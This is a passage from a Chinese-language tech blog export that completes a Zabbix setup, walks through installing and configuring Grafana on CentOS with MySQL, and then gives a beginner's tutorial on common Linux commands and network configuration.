<p>配置Server细节<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixSix.png"><br>具体配置即可，Name表示这个Zabbix服务的名字，这里起名叫ITHEIMA-TEST</p>
<p>安装前总结预览</p>
<p>检查确认没有问题就下一步<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixSeven.png"></p>
<p>配置完成<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixEight.png"><br>初始管理员账户Admin密码zabbix</p>
<p>输入账户密码后，就能进入zabbix页面了。</p>
<p>如下图：<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixNine.png"><br>现在是一个崭新的zabbix等待我们去探索。</p>
<h2 id="运维监控Grafana部署"><a href="#运维监控Grafana部署" class="headerlink" title="运维监控Grafana部署"></a>运维监控Grafana部署</h2><h3 id="部署形式"><a href="#部署形式" class="headerlink" title="部署形式"></a>部署形式</h3><p>Grafana支持两种部署形式</p>
<ul>
<li>自行部署, 可以部署在操作系统之上. 自行提供服务器, 域名等.</li>
<li>Grafana官方托管. 无需安装, 在线注册即可得到一个专属于自己的Grafana, 但是要花钱的. 是一种SaaS服务<br>我们选择方式1</li>
</ul>
<h3 id="安装-15"><a href="#安装-15" class="headerlink" title="安装"></a>安装</h3><p>Grafana支持常见的绝大多数操作系统, 如windows mac linux 同时也支持部署在docker中.</p>
<p>大多数情况下, Grafana都是部署在linux服务器之上. 所以本课程也是基于Linux系统来讲解.</p>
<p>对windows mac系统 或 docker部署有兴趣的同学, 请参考: <a href="https://grafana.com/grafana/download">https://grafana.com/grafana/download</a></p>
<p>我们部署Grafana可以使用YUM来进行部署.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个文件</span></span><br><span class="line">vim /etc/yum.repos.d/grafana.repo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将下面的内容复制进去</span></span><br><span class="line">[grafana]</span><br><span class="line">name=grafana</span><br><span class="line">baseurl=https://packages.grafana.com/oss/rpm</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://packages.grafana.com/gpg.key</span><br><span class="line">sslverify=1</span><br><span class="line">sslcacert=/etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最后安装</span></span><br><span class="line">yum install grafana</span><br></pre></td></tr></table></figure>

<h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h3><p>grafana-server具有许多配置选项，这些选项可以在.ini配置文件中指定，也可以使用环境变量指定。</p>
<blockquote>
<p>Note. Grafana needs to be restarted for any configuration changes to take effect.</p>
</blockquote>
<h4 id="配置文件注释"><a href="#配置文件注释" class="headerlink" title="配置文件注释"></a>配置文件注释</h4><p>;符号在.ini文件中全局表示注释 ()</p>
<h4 id="配置文件路径"><a href="#配置文件路径" class="headerlink" title="配置文件路径"></a>配置文件路径</h4><p>如果是自己解压安装, 或者自行编译的方式安装, 配置文件在:</p>
<ul>
<li>默认: $WORKING_DIR&#x2F;conf&#x2F;defaults.ini</li>
<li>自定义:$WORKING_DIR&#x2F;conf&#x2F;custom.ini</li>
<li>自定义配置文件路径可以被参数–config覆盖</li>
</ul>
<blockquote>
<p>对于YUM RPM 安装的方式, 配置文件在: &#x2F;etc&#x2F;grafana&#x2F;grafana.ini</p>
</blockquote>
<h4 id="使用环境变量"><a href="#使用环境变量" class="headerlink" title="使用环境变量"></a>使用环境变量</h4><p>可以使用以下语法使用环境变量来覆盖配置文件中的所有选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GF_&lt;SectionName&gt;_&lt;KeyName&gt;</span><br></pre></td></tr></table></figure>

<p>其中SectionName是方括号内的文本。一切都应为大写，.应替换为_ 例如，给定以下配置设置：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># default section</span></span><br><span class="line">instance_name = <span class="variable">$&#123;HOSTNAME&#125;</span></span><br><span class="line"></span><br><span class="line">[security]</span><br><span class="line">admin_user = admin</span><br><span class="line"></span><br><span class="line">[auth.google]</span><br><span class="line">client_secret = 0ldS3cretKey</span><br></pre></td></tr></table></figure>

<p>Then you can override them using:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> GF_DEFAULT_INSTANCE_NAME=my-instance</span><br><span class="line"><span class="built_in">export</span> GF_SECURITY_ADMIN_USER=<span class="literal">true</span>	<span class="comment"># GF_ 固定 SECURITY 是SectionName ADMIN_USER 是配置的key 转大写 . 转 _</span></span><br><span class="line"><span class="built_in">export</span> GF_AUTH_GOOGLE_CLIENT_SECRET=newS3cretKey</span><br></pre></td></tr></table></figure>

<h3 id="开始配置"><a href="#开始配置" class="headerlink" title="开始配置"></a>开始配置</h3><p>Grafana支持使用Sqlite3 Postgresql Mysql这三种数据库作为其元数据的存储.</p>
<p>我们课程使用Mysql. 和zabbix的元数据mysql共用一个实例</p>
<p>只需要配置如下内容即可:</p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/grafanaOne.png"></p>
<p>并登陆mysql, 执行:</p>
<p>create database grafana CHARACTER SET utf8 COLLATE utf8_general_ci;</p>
<p>创建Grafana使用的数据库作为元数据存储.</p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start grafana-server</span><br><span class="line">systemctl <span class="built_in">enable</span> grafana-server</span><br></pre></td></tr></table></figure>
<p>浏览器打开：<a href="http://node1:3000/">http://node1:3000</a></p>
<p>默认账户密码：admin&#x2F;admin</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2024/03/28/Linux/</url>
    <content><![CDATA[<h1 id="Linux基础命令"><a href="#Linux基础命令" class="headerlink" title="Linux基础命令"></a>Linux基础命令</h1><h2 id="Linux的目录结构"><a href="#Linux的目录结构" class="headerlink" title="Linux的目录结构"></a>Linux的目录结构</h2><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/mulu.png"></p>
<ul>
<li>&#x2F;，根目录是最顶级的目录了</li>
<li>Linux只有一个顶级目录：&#x2F;</li>
<li>路径描述的层次关系同样适用&#x2F;来表示</li>
<li>&#x2F;home&#x2F;itheima&#x2F;a.txt，表示根目录下的home文件夹内有itheima文件夹，内有a.txt</li>
</ul>
<h2 id="Linux命令基础格式"><a href="#Linux命令基础格式" class="headerlink" title="Linux命令基础格式"></a>Linux命令基础格式</h2><blockquote>
<p>command [-options] [parameter]</p>
</blockquote>
<ul>
<li>command：命令本身</li>
<li>-options：[可选，非可选]命令的一些选项，可以通过选项控制命令的行为细节</li>
<li>parameter:[可选，非必填]命令的参数，多数用于命令的指向目标等</li>
</ul>
<p>语法中的[ ],表示可选的意思</p>
<p>示例:</p>
<ul>
<li>ls -l &#x2F;home&#x2F;itheima，ls是命令本身，-l 是选项，&#x2F;home&#x2F;itheima是参数</li>
<li>意思是以列表的形式，显示&#x2F;home&#x2F;itheima目录内的内容</li>
<li>cp -r test1 test2，cp是命令本身，-r 是选项，test1和test2是参数</li>
<li>意思是复制文件夹test1成为 test2</li>
</ul>
<h2 id="Linux快捷键"><a href="#Linux快捷键" class="headerlink" title="Linux快捷键"></a>Linux快捷键</h2><ul>
<li><p>ctrl + c：强制停止</p>
</li>
<li><p>ctrl + d：退出或登出</p>
</li>
</ul>
<p>​ 退出账户的登录或者退出特定程序的专属页面，python程序的页面ctrl + c没效果使用ctrl</p>
<p>​ ps：不能用于退出vi&#x2F;vim</p>
<ul>
<li><p>history命令，查看历史输入过的命令</p>
</li>
<li><p>!命令前缀，自动执行上一次匹配前缀的命令。</p>
</li>
</ul>
<p>​例如：!py匹配以py开头匹配最近的一次命令并执行</p>
<ul>
<li>ctrl + r：历史命令搜索</li>
</ul>
<p>​ 输入内容去匹配历史指令</p>
<p>​ 如果是需要的<br>​ 1.回车键直接执行<br>​ 2.键盘的左右键，可以直接得到此命令（不执行）</p>
<ul>
<li>光标移动快捷键</li>
</ul>
<p>ctrl+a,跳到命令开头<br>ctrl+e,跳到命令结尾<br>ctrl+键盘左键，向左跳一个单词<br>ctrl+键盘右键，向右跳一个单词</p>
<ul>
<li>清屏ctrl + l或者命令clear</li>
</ul>
<h3 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h3><p>功能：列出文件夹信息</p>
<p>语法：ls [-l -h -a] [参数]</p>
<ul>
<li>参数：被查看的文件夹，不提供参数，表示查看当前工作目录</li>
<li>-l，以列表形式查看</li>
<li>-h，配合-l，以更加人性化的方式显示文件大小，加上单位</li>
<li>-a，显示隐藏文件</li>
</ul>
<h3 id="隐藏文件、文件夹"><a href="#隐藏文件、文件夹" class="headerlink" title="隐藏文件、文件夹"></a>隐藏文件、文件夹</h3><p>在Linux中以.开头的，均是隐藏的。</p>
<p>默认不显示出来，需要-a选项才可查看到。</p>
<h3 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h3><p>功能：展示当前工作目录</p>
<p>语法：pwd</p>
<h3 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h3><p>功能：切换工作目录</p>
<p>语法：cd [目标目录]</p>
<p>参数：目标目录，要切换去的地方，不提供默认切换到当前登录用户HOME目录</p>
<h3 id="HOME目录"><a href="#HOME目录" class="headerlink" title="HOME目录"></a>HOME目录</h3><p>每一个用户在Linux系统中都有自己的专属工作目录，称之为HOME目录。</p>
<p>普通用户的HOME目录，默认在：&#x2F;home&#x2F;用户名</p>
<p>root用户的HOME目录，在：&#x2F;root</p>
<p>FinalShell登陆终端后，默认的工作目录就是用户的HOME目录</p>
<h3 id="相对路径、绝对路径"><a href="#相对路径、绝对路径" class="headerlink" title="相对路径、绝对路径"></a>相对路径、绝对路径</h3><p>相对路径，&#x3D;&#x3D;非&#x3D;&#x3D;&#x2F;开头的称之为相对路径</p>
<p>相对路径表示以当前目录作为起点，去描述路径，如test&#x2F;a.txt，表示当前工作目录内的test文件夹内的a.txt文件</p>
<p>绝对路径，&#x3D;&#x3D;以&#x3D;&#x3D;&#x2F;开头的称之为绝对路径</p>
<p>绝对路径从根开始描述路径</p>
<h3 id="特殊路径符"><a href="#特殊路径符" class="headerlink" title="特殊路径符"></a>特殊路径符</h3><p>.，表示当前，比如.&#x2F;a.txt，表示当前文件夹内的a.txt文件<br>..，表示上级目录，比如..&#x2F;表示上级目录，..&#x2F;..&#x2F;表示上级的上级目录<br>~，表示用户的HOME目录，比如cd ~，即可切回用户HOME目录</p>
<h3 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h3><p>功能：创建文件夹</p>
<p>语法：mkdir [-p] 参数</p>
<p>参数：被创建文件夹的路径<br>选项：-p，可选，表示自动创建不存在的父目录，多路径&#x2F;home&#x2F;itcast&#x2F;good&#x2F;666</p>
<h3 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h3><p>功能：创建文件</p>
<p>语法：touch 参数</p>
<p>参数：被创建的文件路径</p>
<h3 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h3><p>功能：查看文件内容</p>
<p>语法：cat 参数</p>
<p>参数：被查看的文件路径</p>
<h3 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h3><p>功能：查看文件，可以支持翻页查看</p>
<p>语法：more 参数</p>
<p>参数：被查看的文件路径<br>在查看过程中：<br>空格键翻页<br>q退出查看</p>
<h3 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h3><p>功能：复制文件、文件夹</p>
<p>语法：cp [-r] 参数1 参数2</p>
<p>参数1，被复制的<br>参数2，要复制去的地方<br>选项：-r，可选，复制文件夹使用<br>示例：</p>
<p>cp a.txt b.txt，复制当前目录下a.txt为b.txt<br>cp a.txt test&#x2F;，复制当前目录a.txt到test文件夹内<br>cp -r test test2，复制文件夹test到当前文件夹内为test2存在</p>
<h3 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h3><p>功能：移动文件、文件夹</p>
<p>语法：mv 参数1 参数2</p>
<p>参数1：被移动的<br>参数2：要移动去的地方，参数2如果不存在，则会进行改名</p>
<h3 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h3><p>功能：删除文件、文件夹</p>
<p>语法：rm [-r -f] 参数…参数</p>
<p>参数：支持多个，每一个表示被删除的，空格进行分隔<br>选项：-r，删除文件夹使用<br>选项：-f，强制删除，不会给出确认提示，一般root用户会用到</p>
<blockquote>
<p>rm命令很危险，一定要注意，特别是切换到root用户的时候。</p>
</blockquote>
<h3 id="which命令"><a href="#which命令" class="headerlink" title="which命令"></a>which命令</h3><p>功能：查看命令的程序本体文件路径</p>
<p>语法：which 参数</p>
<p>参数：被查看的命令</p>
<h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><p>功能：搜索文件</p>
<p>语法1：按文件名搜索：find 路径 -name 参数</p>
<p>路径，搜索的起始路径<br>参数，搜索的关键字，支持通配符， 比如：&#96;&#96;test表示搜索任意以test结尾的文件<br>语法2：按文件大小查找文件：find 起始路径 -size +&#x2F;-n[kMG]</p>
<p>+、- 表示大于和小于</p>
<p>n表示大小数字</p>
<p>kMG表示大小单位，k(小写字母)表示kb，M表示MB，G表示GB<br>示例:</p>
<p>查找小于10KB的文件: find &#x2F; -size -10k<br>查找大于100MB的文件: find &#x2F; -size +100M<br>查找大于1GB的文件: find &#x2F; -size +1G</p>
<h3 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h3><p>功能：过滤关键字</p>
<p>语法：grep [-n] 关键字 文件路径</p>
<p>选项-n，可选，表示在结果中显示匹配的行的行号。<br>参数，关键字，必填，表示过滤的关键字，带有空格或其它特殊符号，建议使用””将关键字包围起来<br>参数，文件路径，必填，表示要过滤内容的文件路径，可作为内容输入端口</p>
<blockquote>
<p>参数文件路径，可以作为管道符的输入</p>
</blockquote>
<h3 id="wc命令"><a href="#wc命令" class="headerlink" title="wc命令"></a>wc命令</h3><p>功能：统计</p>
<p>语法：wc [-c -m -l -w] 文件路径</p>
<p>选项，-c，统计bytes数量<br>选项，-m，统计字符数量<br>选项，-l，统计行数<br>选项，-w，统计单词数量<br>参数，文件路径，被统计的文件，可作为内容输入端口<br>参数文件路径，可作为管道符的输入</p>
<h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符|"></a>管道符|</h3><p>写法：|</p>
<p>功能：将符号左边的结果，作为符号右边的输入</p>
<p>示例：</p>
<p>cat a.txt | grep itheima，将cat a.txt的结果，作为grep命令的输入，用来过滤itheima关键字</p>
<p>可以支持嵌套：</p>
<p>cat a.txt | grep itheima | grep itcast</p>
<h3 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h3><p>功能：输出内容</p>
<p>语法：echo 参数</p>
<p>参数：被输出的内容</p>
<h3 id="反引号"><a href="#反引号" class="headerlink" title="&#96;反引号"></a>&#96;反引号</h3><p>功能：被两个反引号包围的内容，会作为命令执行</p>
<p>示例：</p>
<p>echo <code>pwd</code>，会输出当前工作目录</p>
<h3 id="tail命令"><a href="#tail命令" class="headerlink" title="tail命令"></a>tail命令</h3><p>功能：查看文件尾部内容</p>
<p>语法：tail [-f -num] 参数</p>
<p>参数：被查看的文件<br>选项：-f，持续跟踪文件修改<br>选项：-num，表示查看尾部多少行，不写默认查看10行</p>
<h3 id="head命令"><a href="#head命令" class="headerlink" title="head命令"></a>head命令</h3><p>功能：查看文件头部内容</p>
<p>语法：head [-n] 参数</p>
<p>参数：被查看的文件<br>选项：-n，查看的行数</p>
<h3 id="重定向符"><a href="#重定向符" class="headerlink" title="重定向符"></a>重定向符</h3><p>功能：将符号左边的结果，输出到右边指定的文件中去</p>
<p>表示覆盖输出<br>表示追加输出</p>
<h3 id="vi编辑器"><a href="#vi编辑器" class="headerlink" title="vi编辑器"></a>vi编辑器</h3><h4 id="命令模式快捷键"><a href="#命令模式快捷键" class="headerlink" title="命令模式快捷键"></a>命令模式快捷键</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/one.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/two.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/three.png"></p>
<h4 id="底线命令快捷键"><a href="#底线命令快捷键" class="headerlink" title="底线命令快捷键"></a>底线命令快捷键</h4><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/four.png"></p>
<h3 id="命令的选项"><a href="#命令的选项" class="headerlink" title="命令的选项"></a>命令的选项</h3><p>我们学习的一系列Linux命令，它们所拥有的选项都是非常多的。</p>
<p>比如，简单的ls命令就有：-a -A -b -c -C -d -D -f -F -g -G -h -H -i -I -k -l -L -m -n -N -o -p -q -Q -r-R -s -S -t -T -u -U -v -w -x -X -1等选项，可以发现选项是极其多的。</p>
<p>课程中， 并不会将全部的选项都进行讲解，否则，一个ls命令就可能讲解2小时之久。</p>
<p>课程中，会对常见的选项进行讲解， 足够满足绝大多数的学习、工作场景。</p>
<h4 id="查看命令的帮助"><a href="#查看命令的帮助" class="headerlink" title="查看命令的帮助"></a>查看命令的帮助</h4><p>可以通过：命令 –help查看命令的帮助手册<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/helpOne.png"></p>
<h4 id="查看命令的详细手册"><a href="#查看命令的详细手册" class="headerlink" title="查看命令的详细手册"></a>查看命令的详细手册</h4><p>可以通过：man 命令查看某命令的详细手册<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/helpTwo.png"></p>
<h2 id="Linux常用操作"><a href="#Linux常用操作" class="headerlink" title="Linux常用操作"></a>Linux常用操作</h2><h3 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h3><p>CentOS系统使用：<br>yum [install remove search] [-y] 软件名称</p>
<ul>
<li>install 安装</li>
<li>remove 卸载</li>
<li>search 搜索</li>
<li>-y，自动确认</li>
<li>yum命令需要root权限，可以su切换到root，或使用sudo提权<br>Ubuntu系统使用</li>
<li>apt [install remove search] [-y] 软件名称</li>
<li>install 安装</li>
<li>remove 卸载</li>
<li>search 搜索</li>
<li>-y，自动确认</li>
</ul>
<blockquote>
<p>yum 和 apt 均需要root权限</p>
</blockquote>
<h3 id="systemctl命令"><a href="#systemctl命令" class="headerlink" title="systemctl命令"></a>systemctl命令</h3><p>功能：控制系统服务的启动关闭等</p>
<p>语法：systemctl start | stop | restart | disable | enable | status 服务名</p>
<p>start，启动<br>stop，停止<br>status，查看状态<br>disable，关闭开机自启<br>enable，开启开机自启<br>restart，重启</p>
<p>系统内置的服务比较多，比如:</p>
<p>NetworkManager,主网络服务<br>network,副网络服务<br>firewalld,防火墙服务<br>sshd,ssh服务(Finalshell远程登录Linux使用的就是这个服务)</p>
<h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><p>功能：创建文件、文件夹软链接（快捷方式）</p>
<p>语法：ln -s 参数1 参数2</p>
<ul>
<li>-s选项，创建软链接</li>
<li>参数1：被链接的</li>
<li>参数2：要链接去的地方（快捷方式的名称和存放位置）</li>
</ul>
<h3 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h3><p>语法：date [-d] [+格式化字符串]</p>
<p>-d 按照给定的字符串显示日期，一般用于日期计算</p>
<p>格式化字符串：通过特定的字符串标记，来控制显示的日期格式</p>
<ul>
<li>%Y 年%y 年份后两位数字 (00..99)</li>
<li>%m 月份 (01..12)</li>
<li>%d 日 (01..31)</li>
<li>%H 小时 (00..23)</li>
<li>%M 分钟 (00..59)</li>
<li>%S 秒 (00..60)</li>
<li>%s 自 1970-01-01 00:00:00 UTC 到现在的秒数</li>
</ul>
<p>示例：</p>
<p>按照2022-01-01的格式显示日期<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/dataOne.png"></p>
<p>按照2022-01-01 10:00:00的格式显示日期<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/dataTwo.png"></p>
<p>-d选项日期计算<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/dataThree.png"><br>支持的时间标记为：<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/dataFour.png"></p>
<h3 id="时区"><a href="#时区" class="headerlink" title="时区"></a>时区</h3><p>修改时区为中国时区<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/timeZone.png"></p>
<h3 id="ntp"><a href="#ntp" class="headerlink" title="ntp"></a>ntp</h3><p>功能：同步时间</p>
<p>安装：yum install -y ntp</p>
<p>启动管理：systemctl start | stop | restart | status | disable | enable ntpd</p>
<p>手动校准时间：ntpdate -u ntp.aliyun.com</p>
<h3 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h3><p>格式：a.b.c.d</p>
<p>abcd为0~255的数字</p>
<h4 id="修改ip地址"><a href="#修改ip地址" class="headerlink" title="修改ip地址"></a>修改ip地址</h4><p>vim &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33</p>
<p>修改BOOTPROTO&#x3D;”static”</p>
<p>在文件中添加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IPADDR=<span class="string">&quot;192.168.39.131&quot;</span></span><br><span class="line">NETMASK=<span class="string">&quot;255.255.255.0&quot;</span></span><br><span class="line">GATEWAY=<span class="string">&quot;192.168.39.2&quot;</span></span><br><span class="line">DNS1=<span class="string">&quot;192.168.39.2&quot;</span></span><br></pre></td></tr></table></figure>
<p>特殊IP：</p>
<p>127.0.0.1，表示本机<br>0.0.0.0<br>可以表示本机<br>也可以表示任意IP（看使用场景）<br>查看ip：ifconfig</p>
<h3 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h3><p>功能：Linux系统的名称</p>
<p>查看：hostname</p>
<p>设置：hostnamectl set-hostname 主机名</p>
<h3 id="配置VMware固定IP"><a href="#配置VMware固定IP" class="headerlink" title="配置VMware固定IP"></a>配置VMware固定IP</h3><ul>
<li><p>修改VMware网络，参阅PPT，图太多</p>
</li>
<li><p>设置Linux内部固定IP</p>
</li>
</ul>
<p>修改文件：&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33</p>
<p>示例文件内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;			# 改为static，固定IP</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;1b0011cb-0d2e-4eaa-8a11-af7d50ebc876&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">IPADDR=&quot;192.168.88.131&quot;		# IP地址，自己设置，要匹配网络范围</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;		# 子网掩码，固定写法255.255.255.0</span><br><span class="line">GATEWAY=&quot;192.168.88.2&quot;		# 网关，要和VMware中配置的一致</span><br><span class="line">DNS1=&quot;192.168.88.2&quot;			# DNS1服务器，和网关一致即可</span><br></pre></td></tr></table></figure>

<h3 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h3><p>语法：ps -ef，查看全部进程信息，可以搭配grep做过滤：ps -ef | grep xxx</p>
<ul>
<li>选项：-e，显示出全部的进程</li>
<li>选项：-f，以完全格式化的形式展示信息（展示全部信息）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/psOne.png"></li>
</ul>
<h3 id="kill命令"><a href="#kill命令" class="headerlink" title="kill命令"></a>kill命令</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/killOne.png"></p>
<h3 id="nmap命令"><a href="#nmap命令" class="headerlink" title="nmap命令"></a>nmap命令</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/nmapOne.png"></p>
<h3 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h3><p>功能：查看端口占用</p>
<p>安装netstat：yum -y install net-tools</p>
<p>用法：netstat -anp | grep xxx 过滤xxx端口信息</p>
<p>查看当前占用端口命令：netstat -tanlp</p>
<h3 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h3><p>测试网络是否联通</p>
<p>语法：ping [-c num] 参数<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/pingOne.png"></p>
<h3 id="wget命令"><a href="#wget命令" class="headerlink" title="wget命令"></a>wget命令</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/wgetOne.png"></p>
<h3 id="curl命令"><a href="#curl命令" class="headerlink" title="curl命令"></a>curl命令</h3><p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/curlOne.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/curlTwo.png"></p>
<h3 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h3><p>功能：查看主机运行状态</p>
<p>语法：top，查看基础信息<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/topOne.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/topTwo.png"><br>可用选项：<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/topThree.png"><br>交互式模式，可用快捷键：</p>
<p>当top以交互式运行（非 -b 选项启动，直接执行top命令）</p>
<p>f键按空格选择，空格取消<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/topFour.png"></p>
<h3 id="df命令"><a href="#df命令" class="headerlink" title="df命令"></a>df命令</h3><p>查看磁盘占用<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/dfOne.png"></p>
<h3 id="iostat命令"><a href="#iostat命令" class="headerlink" title="iostat命令"></a>iostat命令</h3><p>查看CPU、磁盘的相关信息</p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/iostatOne.png"><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/iostatTwo.png"></p>
<h3 id="sar命令"><a href="#sar命令" class="headerlink" title="sar命令"></a>sar命令</h3><p>查看网络统计<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/Linux/%E5%8E%8B%E7%BC%A9/sarOne.png"></p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>临时设置：export 变量名&#x3D;变量值<br>永久设置：</p>
<ul>
<li>针对当前用户，设置用户HOME目录内：vim ~&#x2F;.bashrc文件，添加export 变量名&#x3D;变量值</li>
<li>针对全局，所有用户，设置&#x2F;etc&#x2F;profile</li>
<li>并通过语法：source配置文件，进行立刻生效，或者重新登录FinalShell生效</li>
</ul>
<h4 id="PATH变量"><a href="#PATH变量" class="headerlink" title="PATH变量"></a>PATH变量</h4><p>记录了执行程序的搜索路径</p>
